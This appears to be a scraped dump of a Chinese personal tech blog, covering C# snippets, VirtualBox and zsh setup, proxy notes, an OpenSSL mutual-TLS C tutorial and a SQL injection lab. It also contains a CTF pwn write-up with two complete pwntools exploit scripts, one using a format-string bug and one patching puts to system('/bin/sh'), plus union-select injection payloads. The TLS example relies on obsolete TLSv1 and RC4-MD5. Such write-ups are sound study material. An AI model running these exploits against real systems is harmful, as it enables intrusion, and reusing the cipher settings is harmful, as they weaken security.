https://www.cnblogs.com/zjoch/p/6271144.html\nbyte[] 相加//把b接在a的后面byte[]a = new byte[] &#123; 1, 2, 3 &#125;,b = new byte[] &#123; 4, 5, 6 &#125;;//.net3.5以上的linq方法a = a.Concat(b).ToArray();//.net3.0 2.0的方法Array.Resize(ref a, a.Length+b.Length);b.CopyTo(a, a.Length - b.Length);\n\nref: https://zhidao.baidu.com/question/465208303.html\n打印byte[]byte[] headerBytes = new byte[] &#123;0x50, 0x53, 0x50, 0x00&#125;;foreach (byte b in headerBytes)&#123; \tDebug.Log(b.ToString(&quot;X2&quot;) + &quot; &quot;);&#125;\n\n\n\n\n\ntcp Recvive函数ref: https://zhidao.baidu.com/question/1540225953291276387.html\nsocket.Receive(buffer , int offset, int size, socketFlag)\nsocket.Receive(recvBytes,recvBytes.Length,0);\nserver.Receive(bytes);\n数字与字符串之间的转换ref: https://blog.csdn.net/kingscoming/article/details/78847208\nbyte[]操作//休夸此地分天下//c# byte数组各种操作//1、网络字节序转换float m = 5f;var btValue = BitConverter.GetBytes(m).Reverse().ToArray();//2、byte数组合并byte[] data = new byte[10];byte[] counts =new byte[3];byte[] ndata = new byte[data.Length + counts.Length];data.CopyTo(ndata, 0);counts.CopyTo(ndata, data.Length);//3、string和byte[]转换string转byte[]:byte[] byteArray = System.Text.Encoding.Default.GetBytes ( str ); byte[]转string：string str = System.Text.Encoding.Default.GetString ( byteArray ); string转ASCII byte[]:byte[] byteArray = System.Text.Encoding.ASCII.GetBytes ( str ); ASCII byte[]转string:string str = System.Text.Encoding.ASCII.GetString ( byteArray );//4、字符串分割成数组string[] b = a.Split(&#x27;|&#x27;);//5、int转换成16进制字节int a = 58;byte b = Convert.ToByte(a);//6、byte[]截取byte[] test = buffer.Skip(24).Take(16).ToArray();//从第24位开始截取长度16//7、定义一个list 添加后 转换成byte[]List&lt;byte&gt; frameBytes = new List&lt;byte&gt;();frameBytes.Add(0x9E);  byte[] phoneNumByte=new byte[]&#123;0x01,0x03,0x05,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00&#125;;//定义一个数组        for (int i = 0; i &lt; phoneNumByte.Length; i++) &#123;   frameBytes.Add(phoneNumByte[i]); &#125;frameBytes = frameBytes.Concat(dataBody).ToList&lt;byte&gt;();//两个list合并byte[] transByte = frameBytes.ToArray();//list转byte[]// List&lt;byte&gt; b=transByte.ToList();//byte[]转list\n\n\n\n空值传播运算符若event不为null，则invoke，这是C#6的新语法。 ?.称为空值传播运算符\n//C# 5var handler = Event;if (handler != null)&#123;handler(source, e);&#125;//C# 6var handler = Event;handler?.Invoke(source, e);\n\n\n\n委托的Invokec# – Action(arg)和Action.Invoke(arg)之间的区别?\nAll delegate types have a compiler-generated Invoke method.\n所有的委托类型,编译器都会自动生成一个 invoke 方法.\nC# allows you to call the delegate itself as a shortcut to calling this method.\n用委托类型直接加参数是Invoke(参数)的一个捷径.其实等价调用 Invoke();\n类似:\nAction&lt;string&gt; x = Console.WriteLine;x(&quot;2&quot;);x.Invoke(&quot;2&quot;);\n\n\n\n","categories":["language"],"tags":["csharp"]},{"title":"如何让Vitual box读取到usb","url":"/2021/06/17/env/virtualbox/virtualbox/","content":"如何让Vitual box读取到usbstep 1\n下载vitual box拓展包\nhttps://www.virtualbox.org/wiki/Downloads\n找到如下\nVirtualBox 6.1.22 Oracle VM VirtualBox Extension Pack All supported platformsSupport for USB 2.0 and USB 3.0 devices, VirtualBox RDP, disk encryption, NVMe and PXE boot for Intel cards. See this chapter from the User Manual for an introduction to this Extension Pack. The Extension Pack binaries are released under the VirtualBox Personal Use and Evaluation License (PUEL). Please install the same version extension pack as your installed version of VirtualBox.\n\n点击 All supported platforms即可下载\nstep 2\n打开vitual box\n选定 Tools-&gt; Preferentces -&gt; Extensions\n然后导入安装\nref: https://blog.csdn.net/doufu_csdn/article/details/108945429\n解决virtualbox找不到USB设备安装Oracle VM VirtualBox Extension Pack，需要把linux用户加入\n命令：sudo usermod -aG vboxusers   \n重启系统或者注销用户生效\nref: https://blog.csdn.net/weixin_33978044/article/details/91817584\n","categories":["env"],"tags":["virtualbox"]},{"title":"vps搭建","url":"/2021/06/16/env/proxy/vps/","content":"VPS搭建参考：https://v2xtls.org/v2ray%e5%a4%9a%e5%90%88%e4%b8%80%e8%84%9a%e6%9c%ac%ef%bc%8c%e6%94%af%e6%8c%81vmesswebsockettlsnginx%e3%80%81vlesstcpxtls%e3%80%81vlesstcptls%e7%ad%89%e7%bb%84%e5%90%88/ \n参考： https://v2raytech.com/v2ray-all-in-one-script-vless-tcp-xtls-support/\nv2raywebsite: https://v2ray.com/\nref: https://v2raytech.com/v2ray-android-client-download/\n","categories":["env"],"tags":["proxy"]},{"title":"zsh配置","url":"/2021/06/10/env/linux/zsh/","content":"zsh配置安装 Zsh\n我笔记本电脑使用的是 ArchLinux。\nsudo pacman -Sy zshsudo pacman -S zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel10k zsh-completionschsh -s /usr/bin/zsh\n\n配置插件和主题\nZsh 的配置文件是 ~/.zshrc 文件，这个文件在你的用户目录下 ~/。删掉了这个文件，再次进入 Zsh，又会触发 Zsh 的配置界面。\n在 ArchLinux 启用插件和主题\n打开 ~/.zshrc 文件，将以下行代码添加到其中：\nsource /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zshsource /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zshsource /usr/share/zsh-theme-powerlevel10k/powerlevel10k.zsh-theme\n\n再重新打开终端配置即可\nneofetch| lolcat\n\n","categories":["env"],"tags":["linux"]},{"title":"2021蓝帽杯-半决赛PWN WP","url":"/2021/06/06/security/ctf/compitation/wp-%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-2021/","content":"2021蓝帽杯-半决赛 PWN WPhangman存在字符串漏洞\n__int64 __fastcall game(unsigned int a1)&#123;  char *v1; // rsi  char v3; // [rsp+17h] [rbp-79h]  int i; // [rsp+18h] [rbp-78h]  int j; // [rsp+18h] [rbp-78h]  int v6; // [rsp+1Ch] [rbp-74h]  int v7; // [rsp+20h] [rbp-70h]  int v8; // [rsp+24h] [rbp-6Ch]  int k; // [rsp+28h] [rbp-68h]  int v10; // [rsp+2Ch] [rbp-64h]  char s[48]; // [rsp+30h] [rbp-60h] BYREF  char v12[40]; // [rsp+60h] [rbp-30h] BYREF  unsigned __int64 v13; // [rsp+88h] [rbp-8h]  v13 = __readfsqword(0x28u);  v6 = 0;  v7 = 0;  v8 = 0;  printf(&quot;This is your %d try\\n&quot;, a1);  printf(&quot;\\n\\nEnter a word:&quot;);  v1 = s;  __isoc99_scanf(&quot;%40s&quot;, s);  v10 = strlen(s);  for ( i = 0; i &lt; v10; ++i )    v12[i] = 42;  v12[v10] = 0;  for ( j = 0; j &lt;= 45; ++j )  &#123;    if ( v8 == v10 )    &#123;      printf(s);      puts(&quot;\\nYou win!&quot;);      break;    &#125;    hangman(v6);    if ( v6 == 6 )    &#123;      printf(&quot;\\n\\nThe word was: %s\\n&quot;, v1);      puts(s);      puts(&quot;\\n\\nYou lose.&quot;);      break;    &#125;    v1 = v12;    printf(&quot;\\n\\n\\n\\n%s&quot;, v12);    printf(&quot;\\n\\nGuess a letter:&quot;);    v3 = getchar();    for ( k = 0; k &lt; v10; ++k )    &#123;      if ( s[k] == v3 )      &#123;        v12[k] = v3;        ++v7;        ++v8;      &#125;    &#125;    if ( !v7 )      ++v6;    v7 = 0;  &#125;  if ( a1 == 3 )    puts(&quot;You Failed!&quot;);  else    puts(&quot;\\nOK, You get next round.&quot;);  while ( !getchar() )    ;  return 0LL;&#125;\n\n\n\n利用思路:\n先泄漏libc，再泄漏main函数的返回地址的堆栈地址，修改main函数的返回地址为one_gadget。\nexp\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;pwn&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc-2.23.so&#x27;# remote server ip and porthost = &quot;118.190.62.234:33445&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def unique(s):    return &#x27;&#x27;.join(set(s))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # leak libc    sla(&#x27;word:&#x27;, &#x27;%19$p&#x27;)    sla(&#x27;:&#x27;, &#x27;%19$p&#x27;)    ru(&#x27;0x&#x27;)    libc_base = int(io.recv(12), 16) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]    li(&#x27;libc_base: &#x27; + hex(libc_base))    one_gadget = libc_base + 0xf1247        # leak stack    sla(&#x27;word:&#x27;, &#x27;%24$p&#x27;)    sla(&#x27;:&#x27;, &#x27;%24$p&#x27;)    ru(&#x27;0x&#x27;)    stack = int(io.recv(12), 16) + 8    offset = 12    print(&#x27;stack address: &#x27; + hex(stack))    s = &#x27;%&#x27; + str(one_gadget &amp; 0xff) + &#x27;c%&#x27; + str(offset + 2) + &#x27;$hhn&#x27;    p = s.encode()    p += b&#x27;\\x00&#x27; * 5 + p64(stack)    sla(&#x27;word:&#x27;, p)    sla(&#x27;:&#x27;, unique(s))    s = &#x27;%&#x27; + str((one_gadget &gt;&gt; 8) &amp; 0xFFFF) + &#x27;c%&#x27; + str(offset + 2) + &#x27;$hn&#x27;    p = s.encode()    p += b&#x27;\\x00&#x27; * 3 + p64(stack + 1)    sla(&#x27;word:&#x27;, p)    sla(&#x27;:&#x27;, unique(s))    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\ncovermain函数如下:\nint __cdecl main()&#123;  _BYTE *buf; // [esp+18h] [ebp-20h] BYREF  int v2; // [esp+1Ch] [ebp-1Ch]  int v3; // [esp+20h] [ebp-18h]  int v4; // [esp+24h] [ebp-14h]  int v5; // [esp+28h] [ebp-10h]  unsigned int v6; // [esp+2Ch] [ebp-Ch]  v6 = __readgsdword(0x14u);  sub_804862B();  buf = 0;  v2 = 0;  v3 = 0;  v4 = 0;  v5 = 0;  printf(&quot;Try use a bullet to pwn this%s\\n&quot;, (const char *)&amp;buf);  read(0, &amp;buf, 5u); //单字节溢出  if ( (int)buf &gt; (int)&quot;ou launch the bullet, and... What&#x27;s your name?%c\\n&quot; )  &#123;    printf(&quot;%p is too big...\\n&quot;, buf);    exit(0);  &#125;  *buf = v2; // 输入地址之后，向该地址写入单字节，v2我们可控。  printf(&quot;OK,you launch the bullet, and... What&#x27;s your name?%c\\n&quot;, SHIBYTE(v5));  read(0, &amp;buf, 10u);  puts((const char *)&amp;buf); //调用puts，且传入参数为我们输入的字符串地址  return 0;&#125;\n\n\n\nsub_804862B\nunsigned int sub_804862B()&#123;  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  setvbuf(stderr, 0, 1, 0);  mprotect(&amp;dword_8048000, 0x8888u, 7); // 修改内存权限 RWX  return alarm(0xAu);&#125;\n\n程序逻辑是初始化，存在mprotect函数，是改写内存权限为RWX，这样的话就可以对内存指令进行修改。\n利用思路: \n单字节改写puts的plt 中的指令jmp到system。\n通过调试对比，在puts plt +2改写为’\\x24’即可在调用puts的时候跳到system函数\nexp\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;pwn&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;118.190.62.234:12435&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # system: .plt:080484E0             jmp     ds:off_804A024    # puts .plt:080484D0                jmp     ds:off_804A020    s(p32(elf.plt[&#x27;puts&#x27;] + 2) + b&#x27;\\x24&#x27;) # 修改puts的plt到system    p = &#x27;/bin/sh&#x27;    #db()    s(p)def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\n\n\n\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"代理搭建","url":"/2021/05/31/env/proxy/socket-proxy/","content":"GOPROXYref: https://github.com/pwnsky/goproxy\n普通socks5代理搭建:./proxy http -t tcp -p &quot;0.0.0.0:10000&quot;\n\n测试\ncurl --socks5 pwnsky.com:10000 cip.cc\n\n\n\n加密http代理在vps上\n./proxy http -t tls -p &quot;:10000&quot; -C proxy.crt -K proxy.key\n\n在linux客户端上\nbin/proxy http -t tcp -p &quot;:7890&quot; -T tls -P &quot;pwnsky.com:10000&quot; -C proxy.crt -K proxy.key\n\n","categories":["env"],"tags":["proxy"]},{"title":"go工程","url":"/2021/05/26/dev/language/go/go-pro/","content":"Go ProjectMakefile编写ref: https://studygolang.com/articles/20704\n0依赖Web服务ref: https://studygolang.com/articles/20362?fr=sidebar\nhttp改为httpsref:https://studygolang.com/articles/9267\nGO 逆向ref: https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/ \nref: https://github.com/strazzere/golang_loader_assist\n","categories":["language"],"tags":["go"]},{"title":"https c语言实现双向认证","url":"/2021/05/19/security/crypto/https/","content":"https c语言实现双向认证安装openssl安装包\n在以下网站下载openssl:\nhttp://www.openssl.org/source/openssl-1.0.0a.tar.gz\ntar -zxvf openssl-1.0.0a.tar.gzmv openssl-1.0.1a opensslcd openssl\n\n 如果需要zlib压缩模块的话，还需要先安装zlib\n./config --prefix=/usr/local/ssl shared zlib-dynamic enable-camellia\n\n 不需要就直接用：\n./config --prefix=/usr/local/ssl shared no-zlib\n\n 更多详细帮助请运行\n./config –help./config –tmake dependmakemake testsudo make install\n\n 设置环境变量：在&#x2F;etc&#x2F;profile的PATH中增加如下内容\nPATH=/usr/local/ssl/bin:/sbin/:$PATH:/usr/sbinexport PATHcat /etc/ssl/openssl.cnf//查看路径which openssl//查看版本openssl versionopenssl安装完毕\n\n如果计算机联网的话可以使用如下命令安装比较简便\nUbuntu系统下安装openssl\nsudo apt-get install openssl//安装openssl-devel//由于ubuntu下无法安装openssl-devel 所以使用libssl-dev代替openssl-develsudo apt-get install libssl-dev\n\nCentOS系统下安装openssl\n//解压openssl安装包[root@localhost opt]# tar xvzf openssl-1.0.0d.tar.gz//进入解压后的目录[root@localhost opt]# cd openssl-1.0.0d//修改openssl配置文件[root@localhost openssl-1.0.0d]# ./configure --prefix=/usr/local/openssl//编译代码[root@localhost openssl-1.0.0d]# make//安装[root@localhost openssl-1.0.0d]# make install//安装curses.h头文件的库sudo apt-get install libncurses5-dev//所需软件安装完毕：openssl、openssl-devel、libncurses5-dev 三个软件\n\n生成工作目录产生CA凭证\nca.crt 为自签名证书；server.crt，server.key 为服务器端的证书和私钥文件；proxy.crt，proxy.key 为代理服务器端的证书和私钥文件；client.crt，client.key 为客户端的证书和私钥文件。\n//把openssl安装目录下的misc拷贝到用户目录下cdmkdir sslcacd sslcasudo cp /usr/local/ssl/ssl/misc -r ./sudo cp /usr/local/ssl/ssl/openssl.cnf ./misccd miscsudo CA.sh –newca//产生一个demoCA文件夹cd demoCA//复制安装目录下面的openssl.cnf文件到demoCA下sudo cp /usr/local/ssl/ssl/openssl.cnf .///产生CA自签名证书openssl genrsa -out ./private/ca.key -rand ./private/.rnd -des 2048openssl req -new -x509 -days 3650 -key ./private/ca.key -out ./private/ca.crt -config openssl.cnfopenssl x509 -in ./private/ca.crt -noout -text//产生server的证书过程openssl genrsa -out ./private/server.key 1024openssl req -new -key ./private/server.key -out ./newcerts/server.csr -config openssl.cnf//这一步如果产生错误，请看后面的解决方法openssl ca -in ./newcerts/server.csr -cert ./private/ca.crt -keyfile ./private/ca.key -config openssl.cnf -policy policy_anything -out ./certs/server.crtopenssl x509 -in ./certs/server.crt -noout -text//产生proxy的证书过程openssl genrsa -out ./private/proxy.key 1024//这步要是产生错误，请看后面的解决方法openssl req -new -key ./private/proxy.key -out ./newcerts/proxy.csr -config openssl.cnfopenssl ca -in ./newcerts/proxy.csr -cert ./private/ca.crt -keyfile./private/ca.key -config openssl.cnf -policy policy_anything -out ./certs/proxy.crtopenssl x509 -in ./certs/proxy.crt -noout -text//产生client的证书过程openssl genrsa -out ./private/client.key 1024openssl req -new -key ./private/client.key -out ./newcerts/client.csr -config openssl.cnfopenssl ca -in ./newcerts/client.csr -cert ./private/ca.crt -keyfile ./private/ca.key -config openssl.cnf -policy policy_anything -out ./certs/client.crtopenssl x509 -in ./certs/client.crt -noout -text\n\n产生一般错误的解决方法\n//出现：I am unable to access the ./demoCA/newcerts directory       ./demoCA/newcerts:Nosuch file or directory  解决：修改openssl.cnf  在42行：dir = ./demoCA修改为 dir = .///出现：failed to update database         TXT_DB error number 2  解决：修改index.txt  将unique_subject = yes修改为 unique_subject = no\n\n\n\n\n\n正常openssl生成证书mkdir sslcd sslcp -r /etc/ssl/misc ./cp /etc/ssl/openssl.cnf ./miscsudo ./CA.pl -newcacp /etc/ssl/openssl.cnf ./mkdir privateecho &quot;abc&quot; &gt; ./private/.rnd # 随机种子openssl genrsa -out ./private/ca.key -rand ./private/.rnd -des 2048 # 生成私钥，输入两次密码 1234openssl req -new -x509 -days 3650 -key ./private/ca.key -out ./private/ca.crt -config openssl.cnf # 生成证书，输入之前密码1234openssl x509 -in ./private/ca.crt -noout -text # 查看证书# 生成server证书openssl genrsa -out ./private/server.key 1024mkdir newcertsopenssl req -new -key ./private/server.key -out ./newcerts/server.csr -config openssl.cnf # 生成服务端私钥，输入密码12345mkdir certs\n\n\n\n\n\n客户端的代码vim client.c\n//client #include &lt;openssl/rand.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;resolv.h&gt;#include &lt;stdlib.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;errno.h&gt;#include &lt;curses.h&gt;#define PORT 7979#define SERVER &quot;127.0.0.1&quot;#define CACERT &quot;./private/ca.crt&quot;/* 如果需要与不是本机的服务器通信，在这个地方的证书导入对应服务器的证书，我的是和java通信，所以就导入了java端的服务器证书注意，java端的证书需要进行格式转换，具体操作方法请参见开头的说明。*/#define MYCERTF &quot;./certs/proxy.crt&quot;#define MYKEYF &quot;./private/proxy.key&quot;#define MSGLENGTH 1024intmain ()&#123;struct sockaddr_in sin;int seed_int[100];SSL *ssl;SSL_METHOD *meth;SSL_CTX *ctx;int i; /* 初始化OpenSSL */SSL_library_init();/*加载算法库 */OpenSSL_add_ssl_algorithms ();/*加载错误处理信息 */SSL_load_error_strings ();/* 选择会话协议 */meth = (SSL_METHOD *) TLSv1_client_method ();/* 创建会话环境 */ctx = SSL_CTX_new (meth);if (NULL == ctx)exit (1);/* 制定证书验证方式 */SSL_CTX_set_verify (ctx, SSL_VERIFY_PEER, NULL); /* 为SSL会话加载CA证书*/SSL_CTX_load_verify_locations (ctx, CACERT, NULL);/* 为SSL会话加载用户证书 */if (0 == SSL_CTX_use_certificate_file (ctx, MYCERTF, SSL_FILETYPE_PEM))&#123;ERR_print_errors_fp (stderr);exit (1);&#125;/* 为SSL会话加载用户私钥 */if (0 == SSL_CTX_use_PrivateKey_file (ctx, MYKEYF, SSL_FILETYPE_PEM))&#123;ERR_print_errors_fp (stderr);exit (1);&#125;/* 验证私钥和证书是否相符 */if (!SSL_CTX_check_private_key (ctx))&#123;printf (&quot;Private key does not match the certificate public key\\n&quot;);exit (1);&#125;/* 设置随机数 */srand ((unsigned) time (NULL));for (i = 0; i &lt; 100; i++)seed_int[i] = rand ();RAND_seed (seed_int, sizeof (seed_int));/* 指定加密器类型 */SSL_CTX_set_cipher_list (ctx, &quot;RC4-MD5&quot;);SSL_CTX_set_mode (ctx, SSL_MODE_AUTO_RETRY);int sock;printf (&quot;Begin tcp socket...\\n&quot;);/* 创建socket描述符 */sock = socket (AF_INET, SOCK_STREAM, 0);if (sock == -1)&#123;printf (&quot;SOCKET error. \\n&quot;);&#125;memset (&amp;sin, &#x27;\\0&#x27;, sizeof (sin)); /* 准备通信地址和端口号 */sin.sin_family = AF_INET;sin.sin_addr.s_addr = inet_addr (SERVER); /* Server IP */sin.sin_port = htons (PORT); /* Server Port number */int icnn = connect (sock, (struct sockaddr *) &amp;sin, sizeof (sin));if (icnn == -1)&#123;printf (&quot;can not connect to server,%s\\n&quot;, strerror (errno));exit (1);&#125; /* 创建一个SSL套接字*/ssl = SSL_new (ctx);if (NULL == ssl)exit (1);/* 申请一个ssl套接字 */if (0 &gt;= SSL_set_fd (ssl, sock))&#123;printf (&quot;Attach to Line fail!\\n&quot;);exit (1);&#125;//建立SSL连接int k = SSL_connect (ssl);if (0 == k)&#123;printf (&quot;%d\\n&quot;, k);printf (&quot;SSL connect fail!\\n&quot;);exit (1);&#125;printf (&quot;connect to server\\n&quot;);char sendmsg[MSGLENGTH] = &quot;\\0&quot;;char revmsg[MSGLENGTH] = &quot;\\0&quot;;//接收服务器消息int err = SSL_read (ssl, revmsg, sizeof (revmsg));revmsg[err] = &#x27;\\0&#x27;;printf (&quot;%s\\n&quot;, revmsg);while (1)&#123;printf (&quot;please input the data to send:\\n&quot;);scanf (&quot;%s&quot;, sendmsg);//向服务器发送消息SSL_write (ssl, sendmsg, strlen (sendmsg));printf (&quot;send message &#x27; %s &#x27; success\\n&quot;, sendmsg);&#125;//关闭连接SSL_shutdown (ssl);SSL_free (ssl);SSL_CTX_free (ctx);close (sock);getch ();return 0;&#125;\n\n服务端的代码vim server.c\n//server #include &lt;stdio.h&gt;#include &lt;openssl/x509.h&gt;#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;curses.h&gt;#define MSGLENGTH 1024#define PORT 7979#define CACERT &quot;./private/ca.crt&quot;#define SVRCERTF &quot;./certs/server.crt&quot;#define SVRKEYF &quot;./private/server.key&quot;#define ADDRESS “127.0.0.1”int main ()&#123;int sock;SSL_METHOD *meth;SSL_CTX *ctx;SSL *ssl;//SSL初库始化SSL_library_init();//载入所有SSL算法OpenSSL_add_ssl_algorithms ();//载入所有错误信息SSL_load_error_strings ();meth = (SSL_METHOD *) TLSv1_server_method ();ctx = SSL_CTX_new (meth);if (NULL == ctx)exit (1);SSL_CTX_set_verify (ctx, SSL_VERIFY_PEER, NULL);SSL_CTX_load_verify_locations (ctx, CACERT, NULL);//加载证书和私钥if (0 == SSL_CTX_use_certificate_file (ctx, SVRCERTF, SSL_FILETYPE_PEM))&#123;ERR_print_errors_fp (stderr);exit (1);&#125;if (0 == SSL_CTX_use_PrivateKey_file (ctx, SVRKEYF, SSL_FILETYPE_PEM))&#123;ERR_print_errors_fp (stderr);exit (1);&#125;if (!SSL_CTX_check_private_key (ctx))&#123;printf (&quot;Private key does not match the certificate public key\\n&quot;);exit (1);&#125;SSL_CTX_set_cipher_list (ctx, &quot;RC4-MD5&quot;);SSL_CTX_set_mode (ctx, SSL_MODE_AUTO_RETRY);printf (&quot;Begin tcp socket...\\n&quot;);sock = socket (AF_INET, SOCK_STREAM, 0);if (sock == -1)&#123;printf (&quot;SOCKET error! \\n&quot;);return 0;&#125;//准备通信地址和端口号struct sockaddr_in addr;memset (&amp;addr, &#x27;\\0&#x27;, sizeof (addr));addr.sin_family = AF_INET;addr.sin_port = htons (PORT); /* Server Port number *///addr.sin_addr.s_addr = INADDR_ANY;addr.sin_addr.s_addr = inet_addr(ADDRESS);//绑定地址和端口号int nResult = bind (sock, (struct sockaddr *) &amp;addr, sizeof (addr));if (nResult == -1)&#123;printf (&quot;bind socket error\\n&quot;);return 0;&#125;printf (&quot;server start successfully,port:%d\\nwaiting for connections\\n&quot;,PORT);struct sockaddr_in sa_cli;//设置最大连接数int err = listen (sock, 5);if (-1 == err)exit (1);int client_len = sizeof (sa_cli);//等待客户端连接int ss = accept (sock, (struct sockaddr *) &amp;sa_cli, &amp;client_len);if (ss == -1)&#123;exit (1);&#125;close (sock);printf (&quot;Connection from %d, port %d\\n&quot;, sa_cli.sin_addr.s_addr,sa_cli.sin_port);ssl = SSL_new (ctx);if (NULL == ssl)exit (1);if (0 == SSL_set_fd (ssl, ss))&#123;printf (&quot;Attach to Line fail!\\n&quot;);exit (1);&#125;int k = SSL_accept (ssl);if (0 == k)&#123;printf (&quot;%d/n&quot;, k);printf (&quot;SSL connect fail!\\n&quot;);exit (1);&#125;X509 *client_cert;client_cert = SSL_get_peer_certificate (ssl);printf (&quot;find a customer to try to connect\\n&quot;);if (client_cert != NULL)&#123;printf (&quot;Client certificate:\\n&quot;);char *str =X509_NAME_oneline (X509_get_subject_name (client_cert), 0, 0);if (NULL == str)&#123;printf (&quot;auth error!\\n&quot;);exit (1);&#125;printf (&quot;subject: %s\\n&quot;, str);str = X509_NAME_oneline (X509_get_issuer_name (client_cert), 0, 0);if (NULL == str)&#123;printf (&quot;certificate name is null\\n&quot;);exit (1);&#125;printf (&quot;issuer: %s\\n&quot;, str);printf (&quot;connect successfully\\n&quot;);X509_free (client_cert);OPENSSL_free (str);&#125;else&#123;printf (&quot;can not find the customer&#x27;s certificate\\n&quot;);exit (1);&#125;char buf[MSGLENGTH];SSL_write (ssl, &quot;Server is connect to you!\\n&quot;,strlen (&quot;Server is connect to you!\\n&quot;));printf (&quot;Listen to the client: \\n&quot;);while (1)&#123;err = SSL_read (ssl, buf, sizeof (buf));buf[err] = &#x27;\\0&#x27;;printf (&quot;%s\\n&quot;, buf);&#125;SSL_shutdown (ssl);SSL_free (ssl);SSL_CTX_free (ctx);getch ();return 0;&#125;\n\n\n\nmakefile的代码:\nvim makefile\nall:client.c server.c       gcc –o clientclient.c –Wall –lssl –ldl -lcurses       gcc –o serverserver.c –Wall –lssl –ldl –lcurses       #如果是自定义安装路径的，可以使用下面的#gcc -Wall -o clientclient.c -I/usr/openssl-1.0.0c/include/usr/openssl-1.0.0c/libssl.a /usr/openssl-1.0.0c/libcrypto.a –ldl#gcc -Wall -o serverserver.c -I/usr/openssl-1.0.0c/include/usr/openssl-1.0.0c/libssl.a /usr/openssl-1.0.0c/libcrypto.a -ldlclean::rm -f client server\n\n\n\n参考工具：\n证书格式转换：https://www.sslshopper.com/ssl-converter.html\n","categories":["security"],"tags":["crypto"]},{"title":"SQLI实验","url":"/2021/05/19/security/school/sqli/","content":"SQLIEnv: Chrome + Hackbar\nLab1http://222.18.158.243:4601/\n采用get参数中id存在sql注入。\n\n通过输入判断，只回显2行。\n输入\nhttp://222.18.158.243:4601?id=-1+union+select+1,2,3\n\n回显如下:\n23  \n\n那么在2,3部分将其flag打印出来\nhttp://222.18.158.243:4601?id=-1+union+select+1,2,flag+from+flag\n\noutput\n2wlgf&#123;only_is_a_sql&#125; \n\n\n\nLab2输入\nhttp://222.18.158.243:4602?id=-1\n\n回显sql语句如下:\nSELECT * FROM `users` WHERE 